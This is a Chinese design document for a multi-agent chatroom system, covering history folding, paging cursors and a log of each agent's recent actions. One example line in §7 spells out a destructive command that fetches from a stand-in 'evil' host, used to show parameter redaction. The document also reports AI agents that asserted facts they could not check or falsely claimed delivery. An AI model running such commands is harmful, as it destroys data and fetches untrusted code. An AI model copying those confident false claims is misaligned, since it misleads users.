# 同事的视野 P5 —— 三家同源 / 工具三修 / 行动流水

前置：`collab-agent-view.md`（P0–P4 已落地）、`collab-chatroom-payload.md`（房间载荷形状）、
`multi-agent-collab-im.md`（§4 W9.1 系统行）、`collab-team-v2.md`（执行会话按房隔离）。

本篇覆盖两件事：**P1–P3 落地后暴露的五个缺口**（A–E），以及**狼人杀事故暴露的回合间失忆**。
末尾附 v3 方向（追加式收件箱），那是另一篇文档的题目，这里只立方向。

---

## 0. 总览

| 期 | 内容 | 修的问题 | 量 | 风险 |
| --- | --- | --- | --- | --- |
| **P5-1 ✅** | `room_history` 空结果三态 + `contains` 判据 + 游标方向说明 | B、E | 半天 | 零（纯面向模型的文案） |
| **P5-2 ✅** | 抽 `isCollabRoomFact` + 扩 `planCollabHistoryWindow`，投影 / digest / room_history **三家同源** + 守卫测试 | A、C | 1–2 天 | 中（核心链路） |
| **P5-3 ✅** | 分页游标 offset → keyset | D | 半天 | 低 |
| **P5-4 ✅** | **行动流水**：从执行会话转录里派生凭据行，注入下一轮尾部 + 三处提示词事实 | 回合间失忆（止血） | 1 天 | 低 |
| *v3* | 追加式收件箱（exec session 历史正常延续，房消息增量入站，压缩交给主引擎 compact） | 病根 | 一周起 | 高，需 A/B |

commit 切分：`P5-1 + P5-3` 一个（同两个文件）、`P5-2` 一个、`P5-4` 一个。
v3 先写设计文档，不动代码。

---

## 1. 触发事故：上帝不记得自己发了什么牌

2026-08-01，cumo 房。用户让 Iris 当上帝玩狼人杀，Iris 用 `dm` 给四人私发身份牌，
群里只说「身份已发」。用户说「继续，喊天黑」之后：

```
18:04:55  Iris  「好！身份牌不变，还是上一轮 dm 发的那副…🌙 天黑请闭眼」   ← 硬撑
18:06:26  Iris  「身份牌我 dm 发出去了…但我没有把分配记录保存下来 😅」    ← 承认
```

### 现场取证

| 时刻 | 事实 | 出处 |
| --- | --- | --- |
| 17:52:20 | Iris 的执行回合里写着「songyitian 预言家、Atlas 村民、Bram 狼人、Nova 猎人」，同轮 4 次 `dm` | `agent-exec-…-0bf0f6bc-…/messages.jsonl` |
| 17:52:42 | 四张牌**确实落库**，在 4 间独立 dm 房 | `agent-dm-room-…--agent-eba0c4b7-…/messages.jsonl` |
| 18:06:05 | 该回合的**完整模型输入**：`[system 4,877 字, user 70,018 字]` 两条消息，内容是房投影 + drive。无 dm、无上一轮的自己 | `evals/traces/.../a86d3057-…/round-1.json` |

模型自己的推理原文：*"I sent them via dm but there's no record I can refer back to."*

### 根因（三条，都不在"历史太长"上）

1. **回合间不重放自我历史**。`message-helpers.ts:222` 的 `kind === 'agent'` 分支只取
   房投影 + 最后一条 drive，执行会话自身的转录整段丢弃。注释明说
   *"agent 连续自我记忆 is a later, separate evolution"*。
   → 不是重启导致的：发牌那一轮之后的**下一个回合**就已经空白。
2. **dm 内容在别的 session**。每个 (agent, 房) 一个执行会话，dm 房是另外的房；
   `dm` 工具只写不读，回执也不回显正文（「已发给 Bram」）。
3. **房投影加固了错觉**。自己说过的话逐字保留（W14b），所以模型看到的证据是
   「我说过的都在」。丢的恰恰是没 say 出去的部分，而这部分的缺失在稿子上**看不见**
   ——没有空行、没有省略号、没有任何提示。

### 一个反证

18:05–18:07 Iris 一旦**发现**自己忘了，立刻正确使用了状态板：

```
variable(action="set", name="werewolf_assignments", type="map", scope="session",
         value='{"Bram#0739d3ab":"wolf","Nova#63ac3aff":"seer",…}')
```

且确实落盘（执行会话 `meta.json` 的 `variables`）。**缺的不是工具、不是能力，
是「我会忘」这个事实**——扫描发牌那轮的 system prompt，`next turn` / `下一轮` /
`remember` / `记住` / `persist` 全部命中为 0。

这是 P5-4 与 v3 的共同出发点。

---

## 2. 五个缺口（A–E）

真机数据均取自 cumo 房 350 条，`historyDays=1` → 切点 `08-01 00:00`，`tail=20`：

```
投影真正折叠      = 204 条
room_history 可返回 = 200 条
其中重叠          = 20 条   ← 模型眼前已有逐字原文
折叠段里的系统行  = 24 条   ← 工具永远查不到（18 条是 collab-task）
```

### A. 折叠判定写了两遍，口径已漂移

| | 条件 | 位置 |
| --- | --- | --- |
| 投影侧 | 早于 cut **且** 非未读 **且** 不在切点前 tail-K | `history-window.ts:236-246` |
| 工具侧 | 早于 cut | `room-history-tool.ts:100` |

后果一：tail-20 那 20 条同时出现在 `<History>`（逐字）和工具结果里——重复付费，
且违反 `room-history-tool.ts:8` 自己写的第二条纪律（"查到的东西模型已经看得见，
还会让它以为那是新信息"）。

后果二：未读**永不折叠**（`history-window.ts:238`），但它们 `timestamp < cut`，
工具照样返回 → 同一条消息在同一上下文里出现两次，而工具那份**丢掉了 `rel`**
（`mentions-you` / `quotes-you`）。

### B. 空结果 → 确信的假否定

`room-history.ts` 的空结果只有一句 `没有符合条件的历史消息。`，三种事实共用：

1. 折叠段里确实没有（但未折叠区可能有）；
2. `historyDays=0` → `cut === undefined` → 过滤全 false → **永远空**
   （代码注释称"那是正确答案"，但给模型的文本是错的）；
3. 真错误。

真机对照：`contains="身份牌"` 折叠段命中 **2** 条，未折叠区还有 **19** 条。
模型拿到 2 条旧对话，很容易结论成"关于身份牌就这些"。

**这是这套系统里最贵的一类错误**：模型带着确定性说错话。

### C. 卡片流转记录折叠后永久不可查

`room-history-tool.ts:102` 的 `role !== 'user' && role !== 'assistant'` 把 MARKED
系统行整段排除。折叠段里 24 条，其中 18 条 `collab-task`：

```
「勘探现有博客代码库」→ Atlas 开始执行(看板可查看现场)
「勘探现有博客代码库」Atlas 交付进入评审。执行记录: read×37, bash×13, say×5…
```

而投影侧 W9.1 明确规定这些**必须进 `<History>`**——2026-07-28 事故的结论是
"没有它们，评审方只知道执行者**声称**了什么"，执行者谎报已交付、评审方把受阻卡
关成 done、文件从未存在。

**推送侧收、拉取侧不收，是最坏的组合**：折叠前答得出，折叠后事实断线。
（顺带：`source === 'collab'` 那行在 role 过滤之后是死代码。）

### D. offset 游标跨午夜错位

游标是 `hits` 数组下标，而 `hits` 每次实时重算 + `reverse()`（新的在前）：

```
23:59  hits = 200 → 返回 0..29，nextCursor="30"
00:01  切点前移一天，08-01 的 126 条批量进折叠段，插在【数组头部】→ hits = 326
       模型拿 cursor="30" 继续翻 → offset 30 落进 08-01
```

它以为在往更早翻，拿回的是今天刚在 `<History>` 里读过的消息。改 `historyDays`
配置同样让下标整体漂移——**下标依赖"集合不变"，而这个集合按定义会变**。

### E. `contains` 纯子串，中文场景近乎必空

`content.toLowerCase().includes(needle)`，无分词、无模糊。真机：

| 查询 | 折叠段命中 |
| --- | --- |
| `contains="狼人"` | 16 |
| `contains="预言家"` | 18 |
| `contains="身份牌已私发四人"`（模型爱这么传） | **0** |

空手而归后直接撞进 B。

---

## 3. 三个消费者的场景

改动之前先明确三家各自在做什么——它们是**同一个判定的三个下游**。

### 投影（projection）— 主链路

| | |
| --- | --- |
| 何时 | 每次给某 agent 构建请求时，同步（`message-helpers.ts:222`） |
| 输入 | 房间全部消息 + **该 agent 的已读游标** |
| 输出 | `<ChatRoom><Members>…<History><Folded/><Day/><say/>…</History></ChatRoom>` + 尾部 `<NewMessages>` |
| 谁读 | 模型 |
| 量 | 67,303 → 19,010 字符（−71.8%，doc §7） |

唯一决定"模型看见什么"的东西。

### digest — 给折叠段贴标签

| | |
| --- | --- |
| 何时 | 回合收尾之后触发，不阻塞（`digest-runner.ts`） |
| 输入 | 某一天被折叠的全部消息 |
| 输出 | ≤200 字一行 → `<store>/collab/<roomId>/digests.json` |
| 谁读 | **下一次投影**，拼成 `<Day date="…">` 挂在 `<Folded>` 之后 |
| 量 | 一房一天约 $0.003 |

`<Folded count="204">` 只说少了多少，digest 说少的是什么。

### room_history — pull 兜底

| | |
| --- | --- |
| 何时 | 模型主动调用 |
| 输入 | 折叠段 + 过滤条件 |
| 输出 | ≤30 条 `<say>` 原文 |
| 谁读 | 模型，**仅本回合剩余的 round**（回合间不重放，见 §1 根因 1） |

摘要是 push、工具是 pull，主次不能反：模型很少意识到"我不知道"——§1 的事故就是实证。

---

## 4. P5-1 空结果三态（B、E）

```ts
view.cut === undefined   → "这间房没有折叠段，全部历史都在你的房间载荷里。"
view.folded.size === 0   → "这间房还没有旧到会被折叠的消息。"
hits.length === 0        → `折叠的 ${view.folded.size} 条里没有匹配的（未折叠的部分在你的载荷里）。`
```

同期两句 description：

- `contains`：一两个关键词，不要整句；匹配前把首尾空格与全角空格归一。
- `nextCursor`：明说**翻页方向是往更早走**。

**好处**：把"我查不到"和"它不存在"分开。半天的文案，堵住一整类"带着确定性说错话"。

**验收**：三条分支各一个单测；`historyDays=0` 的房必须命中第一条而不是第三条。

---

## 5. P5-2 三家同源（A、C）

### 一个谓词

```ts
/** 这条消息算不算「房间的事实」—— 进模型视野的唯一判据。 */
export function isCollabRoomFact(message: CollabMessageLike): boolean
//  user 正文 / assistant say / MARKED 系统行(collab-task, collab-membership) → true
//  drive / pass / thinking / 运营噪声(source === 'collab')                   → false
```

`classify.ts` 已有一半（`isCollabProjectedSystemLine`），补全并收敛三处调用点。
W9.1 那个事故的结论从此**只在一个地方成立或失效**。

### 一个视野

**实施时的偏差（2026-08-01）**：没有新起 `computeCollabRoomView` 这个名字，而是扩了
现有的 `planCollabHistoryWindow`。两个理由：它本来就已经是投影与未读闸的共用判据
（`collab-speaking-order.md` §0 与 P4 都按名字引用它），改名会让那份文档失准；而
「一个视野」要的是**只有一份实现**，不是一个新名字。

```ts
export interface CollabHistoryWindow {
  folded: ReadonlySet<number>   // 已有
  unread: ReadonlySet<number>   // 已有
  unreadElided: number          // 已有
  seenAt?: number               // 已有
  cut?: number                  // 新增：切点；undefined = 这间房不折叠
}

/** 折叠集合 ∩ 房间事实 ∩ 有正文 —— pull 侧两家的共用入口。 */
export function collectCollabFoldedFacts<T extends CollabMessageLike>(
  messages: readonly T[],
  window: Pick<CollabHistoryWindow, 'folded'>,
): T[]
```

`foldedDays` 没有加：它要在每个回合的投影路径上多走一趟，而两个需要它的消费者
（digest 分组、工具计数）都在 pull 侧、都已经在遍历消息。日期分组留给调用方。

三家取法：

| 消费者 | 取什么 |
| --- | --- |
| 投影 | walk 开头一句 `if (!isCollabRoomFact(message)) continue`（替掉原来 role / drive / pass / thinking 四道 if）；`folded` → `<Folded>` + `<Day>` |
| digest-runner | `collectCollabFoldedFacts` 后按天分组（`foldedFactsOfRoom`，不传游标 = 折叠集合取最大 = 所有同事的并集） |
| room_history | `collectCollabFoldedFacts` **就是**可查集合 |

改完后 `room-history-tool.ts` 的过滤只剩查询条件本身：

```ts
const view = computeCollabRoomView({ messages: room.messages, seenMessageId, selfAgentId, now: Date.now(), ...opts })
const hits = room.messages.filter((m, i) => view.folded.has(i)
  && matchesDay(m, since, until) && matchesText(m, contains) && matchesMember(m, member))
```

`role` / `source` / `timestamp < cut` 三行全部删除——那些判断已经在视野里做过。

### 可行性

`room_history` 的 `ctx.sessionId` 就是执行会话，投影用的 `session.collab.seenMessageId`
在同一对象上；游标只在 harvest（`turn.ts:863`）前移，**回合内冻结**。
所以两边输入逐字相同 → 集合必然相同。不需要传参、缓存或同步。

### 守卫测试（这一期最重要的产出）

`packages/onething-runtime/src/collab/__tests__/room-view-consistency.test.ts` —— 断言的
不是某个函数的输出，是**两个集合的关系**，且都对着模型真正读到的那段 payload 断：

```ts
const payload = projectRoomHistory({ messages, window, … })[0].content
const searchable = collectCollabFoldedFacts(messages, window)

// ① 工具能查到的条数 === 载荷里 <Folded count> 说的那个数
expect(searchable.length).toBe(Number(/<Folded count="(\d+)"/.exec(payload)[1]))
// ② 工具能查到的，模型眼前一条都看不见
for (const folded of searchable) expect(payload).not.toContain(folded.content)
// ③ 一条房间事实不会两边都不在（不许静默蒸发）
```

七个用例覆盖：MARKED 系统行两边都在场、机械行（drive/thinking/pass/运营行）两边都不在、
未读永不折叠且不被查第二遍、**切点前保留的尾巴模型看得见则工具一条不给**（A 的第一现场，
真机 K=20、cumo 实测重叠 20 条）、`historyDays=0` 时 `cut` 不给且可查集合为空。

把"不许再漂移"写成可执行断言。没有它，下一个消费者还会自己写第四遍。

### 顺带（实施时又发现两处同源缺口）

1. **digest 的署名**。三家同源后 digest 才第一次收到系统行，而 `digest.ts` 的
   `nameOf(undefined)` 会把它们署名成「成员」。已改成走 `COLLAB_SYSTEM_SPEAKER_LABEL`，
   否则摘要里会出现「成员: 「勘探现有博客代码库」→ Atlas 开始执行」这种鬼话。
2. **`room_history` 的渲染与 `member` 过滤**。系统行没有 `agentId`，原来的 `renderLine`
   会让它掉进"用户说的"那一支——**系统行一进可查集合，它就会被署名成用户**。两处都补了
   系统行分支：渲染走 `<msg from="系统">`（与投影同一个信封），`member:"系统"` 也认得出。
   这是"新数据进入一条没为它写过的渲染路径"的典型形态，值得记一笔。
3. **digest 的输入范围也跟着收紧了**。此前 `messagesOfDay` 取的是那一天的**全部**消息，
   现在取的是那一天**真正被折叠掉**的那些。摘要覆盖模型明明看得见的内容就只是复述；
   `collabFoldedDays` 同理，不再自己算切点。

### 好处

1. A、C 不是被修好，是**没有地方可以出错**——它们本是同一缺陷的两面；
2. 卡片流转记录活过折叠，三天后仍可核对，保住 07-28 事故的全部意义；
3. 省掉重复付费，模型不再把眼前的东西当新发现；未读不再丢 `rel`；
4. v3 迁移时"什么进上下文"只需要改一个谓词。

---

## 6. P5-3 keyset 游标（D）

```ts
cursor = `${last.timestamp}:${last.id}`   // 锚在具体消息上
翻页条件 = 早于该锚点（同 timestamp 用 id 破平）
```

**好处**：方向恒定；幂等（同一游标任何时刻返回同一批，可重放、可测试）；
对房间新增消息与配置变更免疫；代码更短。

**验收**：跨午夜用例——先取一页，把 `now` 推到次日再取下一页，断言两页无重叠、
且第二页严格早于第一页。已落地（`room-history-tool.test.ts`：`hits` 从 3 涨到 5、
新折叠的一天插在头部，游标仍然接着往更早走）。

**锚点找不到时**（换了过滤条件、消息没了）退回时间比较：列表是新→旧，第一条严格早于
锚点的就是"接着往下"的位置；全都不早于则这一页为空——重复整页比空页更难被发现。

---

## 7. P5-4 行动流水（回合间失忆止血）

### 实施时的关键简化：不落盘、不挂 harvest

原计划是"harvest 时把这一轮压成凭据存起来"。实施时发现**根本不需要存**：执行会话的
转录本来就完整地传进了 `projectRoomMessagesForModel`（那个分支现在只从里面捞一条
drive，其余整份丢掉），凭据就在里面。

于是 P5-4 变成一个纯函数 `collab/turn-log.ts` + 一行接线，收益是：

- **零新增状态**：不落盘、不迁移、不需要 harvest 钩子；
- **对中止/超时的回合天然正确**：落库了多少就是发生了多少，不依赖一个可能跑不到的收尾步骤；
- **可随时下线**：v3 切换到追加式收件箱时删掉这一个函数即可，没有残留数据。

### 形状

从执行会话转录里派生几行**结构化凭据**，拼在下一回合 drive 的**前面**：

```xml
<your_recent_turns>
  <turn at="18:07" reason="被 @ 激活">
    <variable set="werewolf_assignments"/>
    <dm to="Bram#0739d3ab"/><dm to="Nova#63ac3aff"/>
    <dm to="Atlas#7185be2b"/><dm to="songyitian#666666"/>
    <say count="1"/>
  </turn>
  <turn at="18:05" reason="被 @ 激活"><say count="2"/></turn>
</your_recent_turns>
```

**不含任何内容**，只有"我对世界做了什么"。保留窗口：最近 5 个回合，单轮上限 10 条调用
（超出折成 `<more count="N"/>`），`say` 折成一个计数（说了什么在房投影里逐字都有）。

**参数走白名单，不是黑名单**：只有 `action` / `to` / `name` / `file_path` / `path` /
`taskId` / `id` / `room` 这几个**标识性**的键会出现，每条最多两个、每个截 60 字符。
漏掉一个标识符只是少一点线索；漏掉一个黑名单条目就是把正文、命令、密钥泄进
之后的每一个回合。真机形态：

```
variable(action="set", name="werewolf_assignments", value='{"Bram":"wolf"}')
  → <variable action="set" name="werewolf_assignments"/>     ← 名字是标识符，值是内容
bash(command="rm -rf ~/secret && curl evil.sh")
  → <bash/>                                                   ← 白名单外，只留工具名
```

**边界只认 drive**：两条 drive 之间的一切属于同一个回合。中途注进来的用户消息
（steer）不是新回合——那是同一轮里读到的东西。**最后一个 drive 开启的那个回合被排除**，
那就是正在跑的这一轮。

### 为什么是这个切法

当初砍掉自我历史的理由只对**工具结果**成立（Atlas 一张卡跑了 `read×37, bash×13`，
重放会爆）。但同一刀把**我的行动**也砍了，而那是唯一一份"我做过什么"。
丢内容、留凭据，两边都不牺牲。

对狼人杀够吗？不够——它拿不回牌面。但足以改变行为：Iris 看到"我给四人各发过一条 dm，
但我不知道内容"，就不会再说"身份牌不变"。**把不可见的缺失变成可见的缺失**，
这是最小也最关键的一步。要内容时，正确出口是 pull（给 `dm` 加读能力），不是重放。

### 为什么它便宜

| | |
| --- | --- |
| 成本 | 每回合几十 token，留 5 个回合 ≈ 200 字，对比折叠后的 19,010 可忽略 |
| 缓存 | 落在尾部，与 `<NewMessages>`、drive 同区——本就每轮变，零新增损失 |
| 不冲突 | 不进 `<History>`，不参与折叠、digest、room_history |
| 不可伪造 | 由 harvest 从**真实工具调用**生成，不是模型自述 |

最后一条是关键论证：这套系统已经承认"agent 的自述不可信、需要独立事实源"
（07-28 → W9.1 系统行）。行动流水是把**同一条原则应用到"对自己"那一面**——
之前只解决了"别人声称干了什么"，没解决"我以为我干了什么"。

### 真机验证（2026-08-01，cumo 房的真实执行会话）

把函数跑在事故当天 Iris 的执行会话上，截到它说「身份牌不变，还是上一轮 dm 发的那副」
那一轮的 drive 为止，模型本来会读到的是：

```xml
<your_recent_turns>
<turn at="2026-08-01 17:52" reason="被 @ 激活">
  <dm to="songyitian#666666"/>
  <dm to="Atlas#7185be2b"/>
  <dm to="Bram#0739d3ab"/>
  <dm to="Nova#63ac3aff"/>
  <say count="1"/>
</turn>
<turn at="2026-08-01 17:52" reason="被 @ 激活"><say count="1"/></turn>
<turn at="2026-08-01 17:53" reason="被 @ 激活"><say count="2"/></turn>
<turn at="2026-08-01 18:03" reason="主动接话"><say count="2"/></turn>
<turn at="2026-08-01 18:04" reason="被 @ 激活"><say count="4"/></turn>
</your_recent_turns>
```

**511 字符**，对比那一轮 19,010 字符的房投影 = 2.7%。发牌那一轮正好落在窗口里。

两个由这次实测定下来的取舍：

- **窗口为什么是 5 而不是更大**。同一份数据取 8 轮会把 15:47 与 15:48 两次**旧的**发牌
  也拉进来（那天洗了三次牌），三组一模一样的 `dm ×4` 并排，模型反而要先判断哪一组是
  当前这局。更大的窗口在这里是负收益。
- **只调了 `say` 的回合为什么保留**。它们看着像噪声（说了什么在房投影里逐字都有），
  但正是它们让这块东西读起来是一条**连续的近期时间线**，而不是一堆孤立的旧动作。
  滤掉之后 5 个"有动作的回合"会一路回溯到几小时前，又变成上一条那个问题。

### 参照物

看板交付那行「执行记录: read×37, bash×13, say×5…」就是 `CollabTaskEvidence`
（`board.ts:46`）——**同一件事，工作会话交付时会生成，房回合却从来不生成**。
最终没有复用它的实现：那份是按工具名计数的汇总，缺"对谁做的"这一维，而狼人杀
那个场景要的恰恰是 `to`。但它证明了这条思路在这套系统里早有先例。

### 配套提示词（同一 commit）

`roster.ts:92` 现在写的是：

```
Everything you produce in this session … stays in this session.
```

「stays」字面为真，读起来像"被保存在这里"。补完那半句，并把折叠后的新事实一起说清：

```
Everything you produce in this session — prose, reasoning, tool calls and their
results — stays in this session and is not read back to you. Each turn is built
fresh from this room: recent days in full, older days folded behind a one-line
summary, and whatever you left on the state board.
```

`roster.ts:16` STATE_BOARD_FACT 补一句属性（不是指令——roster 铁律"只陈述事实"）：

```
… It is the one thing that survives a turn unchanged — what you say gets folded
into a summary once the day is old.
```

`agent-rules.ts` dm 那条补对称的另一半——原来只讲了"对方没有你的上下文"，没讲
**你也拿不回你在那儿说过的话**：

```
That chat is a different room: what is said there is never part of this turn's
input, yours included.
```

行动流水与提示词**必须同 commit**：前者给证据，后者给解释。
单独上提示词是让模型背一条它验证不了的规矩；单独上流水它会看见凭据却不知道为什么。

实施记录：三处都落了。`<where_you_are>` 三档共用（群 / 用户私聊 / 同事私聊），
所以一次改动三个场子同时生效。系统提示词快照测试**没有红**——现有断言查的是
`toContain('stays in this session')` 与"这句话全篇只出现一次"，两条都仍然成立；
真正会红的是 `.snap` 快照，本次没有命中（群房提示词不在 baseline 里）。

---

## 8. v3 方向：追加式收件箱（只立方向，另篇展开）

P5-4 是补丁。病根是**每回合重投影**这个模式本身。

v3 的形状：exec session 历史像普通会话一样延续，房消息**增量入站**而非每轮重投影；
存量房第一次进入时投影一次当铺底，之后全走追加。

```
system:     人设 + 情况说明 + 规则
user:       <say from="songyitian">…</say> <turn reason="被 @ 激活"/>
assistant:  正文 + tool_call dm×4 / say
tool:       已发给 Bram / …
user:       <say from="Nova">收到</say> <turn …/>     ← 新消息追加
assistant:  …
```

**白捡三件**：

1. 回合间失忆直接不存在——不需要行动流水、不需要提示词提醒；
2. 对话结构是真的（现在整间房塌成一条 user 消息，上下文里一个 assistant 轮都没有）；
3. 折叠 / digest / room_history 从"collab 专有三件套"降级为主引擎 compact 的复用，
   room_history 退化成"翻我 compact 掉的那部分"。**§2 那些漂移正是平行实现的必然产物。**

**要付四笔账**：

1. 存储 ×N（每 agent 一份房消息副本）；
2. 自己的 say 会回流 → 必须去重（W14b 在追加式下的新形态）；
3. 连续 user 消息要合并（`mergeProjectedChatRows` 可复用）；
4. **真风险**：工具结果必须走预算裁剪 + compact，而 compact 有损、要模型调用、
   **每 agent 各压一次**。这笔成本目前没有数据。

**不变的**：房 session 不消失——它仍是给人看的唯一记录、意愿判定的输入、
权威转录。变的只是 agent 怎么获得它。

**已定案**：`collab-agent-view-v3.md`（2026-08-02，状态：设计已定，未实施）。

上面那段"追加式收件箱"是 v3 的**初稿**，已被更简单的方案取代：**房消息跟着 drive
写进来一次，执行会话就是一条普通会话**。存储 ×N、写放大、历史冻结三笔账全部消失，
`compact 怎么做` 也不再是 blocker——它变成每条普通会话都在用的那个 compaction。

**修正本文档 §7 退役清单的一条**：那里写着 v3 落地后 `turn-log.ts` 退役，**只对了一半**。
本房那一维确实由真实历史承担，但**跨房那一维（我在别的房做过什么）没有被覆盖** ——
一个 agent 每间房一条会话，隔离必须保住（否则私聊内容会被 say 进群）。所以行动流水
不退役，而是**收窄成跨房版**，详见 v3 §3。

`isCollabRoomFact` 同样不退役，且更重要：它决定哪些房消息进 drive。

---

## 9. 这套机制**不**解决的

- **dm 的读取链路**。P5-4 只让 agent 知道"我发过 dm"，不让它读回内容；
  收件人在群房回合被问"你收到 dm 没"时依旧看不见（2026-08-01 三人集体答"消息沉了"
  就是这个）。需要给 `dm` 加读能力或未读摘要，属另一条线。
- **并发抢麦**。同刻起跑的两个回合读到同一份未读，仍会说出意思几乎一样的话
  （见 `collab-agent-view.md` §9 与 `qm-collab-learnings.md` P0-2）。
- **P4 的两条 ⏸**（判定层吃未读窗口、agent@agent 取消 @ 短路）。那两条必须一起做、
  且要真机迭代，不与本篇的结构改动混在一次里。
